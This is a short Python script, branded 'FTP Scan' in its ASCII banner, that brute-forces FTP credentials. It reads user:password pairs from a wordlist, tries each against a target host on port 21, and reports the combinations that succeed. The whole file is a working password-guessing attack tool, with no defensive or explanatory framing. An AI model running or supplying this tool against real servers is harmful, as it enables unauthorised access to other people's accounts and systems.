#!/usr/bin/env python
import argparse
import ftplib


class colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"


banner = r"""{}{}
 ____  ____  ____    ____   ___   __   __ _  _   
(  __)(_  _)(  _ \  / ___) / __) / _\ (  ( \/ \  
 ) _)   )(   ) __/  \___ \( (__ /    \/    /\_/  
(__)   (__) (__)    (____/ \___)\_/\_/\_)__)(_)  
=====================Written by t@kuz00E898======{}
""".format(colors.OKGREEN, colors.BOLD, colors.END)


def ftp_login(hostname, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, 21)
        ftp.login(username, password)
        print("[+] {} FTP Login Succeeded with {}:{}".format(hostname, username, password))
        ftp.quit()
        return username, password
    except Exception as e:
        pass

    print("[-] Could not brute force FTP credentials {}:{}".format(username, password))
    return None, None


def main():
    print(banner)
    parser = argparse.ArgumentParser(usage="%(prog)s-H <target host> -F <password lis>")
    parser.add_argument("-H", dest="target_host", type=str, required=True, help="Specify target host.")
    parser.add_argument("-F", dest="password_file", type=str, required=True,
                        help="Specify file containing all possible user:passwords combinations.")
    options = parser.parse_args()

    fn = open(options.password_file, "r")
    for line in fn.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip("\r").strip("\n")
        print("[*] Testing: {}:{}".format(username, password))
        ftp_login(options.target_host, username, password)


if __name__ == "__main__":
    main()
